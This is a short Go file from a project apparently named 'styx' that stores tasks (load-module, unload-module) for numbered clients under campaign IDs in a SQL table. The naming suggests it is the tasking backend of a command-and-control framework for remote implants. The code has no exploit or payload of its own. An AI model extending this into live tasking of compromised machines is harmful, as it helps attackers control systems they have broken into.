package db

import (
	"encoding/json"
	"fmt"
	"styx/internal/shared"
)

type NewTaskReq struct {
	Cmd        string `json:"cmd"`
	Args       []Arg  `json:"args"`
	ClientID   int32  `json:"client_id"`
	CampaignID string `json:"campaign_id"`
}

type Arg struct {
	Type  string `json:"type"`
	Value any    `json:"value"`
}

var CmdStrToCmdCode = map[string]int{
	"load-module":   0x1,
	"unload-module": 0x2,
}

func (db *DB) InsertTask(task NewTaskReq) (int32, error) {
	taskID, err := shared.GenRandInt32()
	if err != nil {
		return 0, err
	}

	jsonArgs, err := json.Marshal(task.Args)
	if err != nil {
		return 0, err
	}

	code, ok := CmdStrToCmdCode[task.Cmd]
	if !ok {
		return 0, fmt.Errorf("unknown command")
	}
	q := `INSERT INTO tasks(TaskID, ClientID, CmdCode, Args, CampaignID) VALUES(?,?,?,?,?)`
	_, err = db.conn.Exec(q, taskID, task.ClientID, code, jsonArgs, task.CampaignID)
	return taskID, err
}
